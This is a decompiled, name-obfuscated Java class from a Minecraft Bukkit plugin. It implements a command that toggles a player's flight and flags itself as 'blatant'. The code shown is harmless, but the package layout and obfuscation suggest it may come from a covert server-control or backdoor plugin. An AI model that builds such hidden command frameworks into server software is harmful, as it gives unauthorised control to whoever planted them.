/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class FlyCommand
extends Command {
    @Override
    public void execute(Core llllllllllllllIIlIlIIIlIIIIIIIll, String llllllllllllllIIlIlIIIlIIIIIIIlI, String[] llllllllllllllIIlIlIIIlIIIIIIIII, Player llllllllllllllIIlIlIIIIlllllllIl) {
        if (!llllllllllllllIIlIlIIIIlllllllIl.isFlying()) {
            llllllllllllllIIlIlIIIIlllllllIl.sendMessage(Settings.PREFIX("Set fly to enabled"));
            llllllllllllllIIlIlIIIIlllllllIl.setAllowFlight(true);
            llllllllllllllIIlIlIIIIlllllllIl.setFlying(true);
        } else {
            llllllllllllllIIlIlIIIIlllllllIl.sendMessage(Settings.PREFIX("Set fly to disabled"));
            llllllllllllllIIlIlIIIIlllllllIl.setAllowFlight(false);
            llllllllllllllIIlIlIIIIlllllllIl.setFlying(false);
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    public FlyCommand() {
        FlyCommand llllllllllllllIIlIlIIIlIIIIIlIII;
    }
}

